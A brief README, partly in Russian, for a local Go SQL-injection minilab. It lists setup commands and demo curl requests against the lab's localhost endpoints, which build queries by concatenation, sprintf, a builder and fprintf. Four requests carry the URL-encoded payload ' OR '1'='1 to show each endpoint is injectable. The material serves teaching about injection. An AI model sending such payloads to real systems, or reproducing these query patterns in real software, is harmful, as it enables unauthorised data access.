### SQLi minilab
```
cd go-sqli-lab
go mod init go-sqli-lab
go get modernc.org/sqlite
go run sqli.go
```

Как взаимодействовать для демо
```
curl "http://localhost:8080/02/sprintf?name=alice"   

НО...

curl "http://localhost:8080/01/concat?name=%27%20OR%20%271%27=%271"
curl "http://localhost:8080/02/sprintf?name=%27%20OR%20%271%27=%271"
curl "http://localhost:8080/03/builder?name=%27%20OR%20%271%27=%271"
curl "http://localhost:8080/04/fprintf?name=%27%20OR%20%271%27=%271"
curl "http://localhost:8080/05/in?name=alice&name=bob"
```